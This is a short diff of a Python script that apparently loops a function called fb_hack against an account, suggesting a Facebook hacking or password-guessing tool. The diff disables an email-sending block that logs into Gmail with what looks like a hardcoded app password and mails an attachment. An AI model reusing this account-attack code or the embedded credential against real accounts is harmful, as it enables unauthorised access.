@@ -118,8 +118,9 @@ password = input("Type your password and press enter:") or "dvxu atqv cngc ro
 while past >= 6:
   fb_hack(ehack, reset, past)
   past += 1
+  past = 1
 
-subject = "An email with attachment from Python"
+"""subject = "An email with attachment from Python"
 body = "This is an email with attachment sent from Python"
 # Create a multipart message and set headers
 message = MIMEMultipart()
@@ -153,3 +154,4 @@ context = ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, text)
+"""
